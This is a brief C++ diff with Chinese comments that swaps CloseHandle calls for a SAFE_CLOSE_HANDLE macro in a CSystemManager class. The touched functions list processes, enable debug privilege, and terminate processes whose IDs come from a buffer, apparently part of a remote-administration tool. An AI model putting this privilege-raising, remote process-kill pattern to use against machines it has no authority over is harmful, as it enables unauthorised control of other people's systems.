@@ -122,7 +122,7 @@ LPBYTE CSystemManager::GetProcessList()
     }
 
     DebugPrivilege(SE_DEBUG_NAME,FALSE);  //还原提权
-    CloseHandle(hSnapshot);       //释放句柄
+    SAFE_CLOSE_HANDLE(hSnapshot);       //释放句柄
     return szBuffer;
 }
 
@@ -152,7 +152,7 @@ BOOL CSystemManager::DebugPrivilege(const char *szName, BOOL bEnable)
         bResult = FALSE;
     }
 
-    CloseHandle(hToken);
+    SAFE_CLOSE_HANDLE(hToken);
     return bResult;
 }
 
@@ -214,7 +214,7 @@ VOID CSystemManager::KillProcess(LPBYTE szBuffer, UINT ulLength)
         hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(szBuffer + i));
         //结束进程
         TerminateProcess(hProcess, 0);
-        CloseHandle(hProcess);
+        SAFE_CLOSE_HANDLE(hProcess);
     }
     DebugPrivilege(SE_DEBUG_NAME, FALSE);    //还原提权
     // 稍稍Sleep下，防止出错
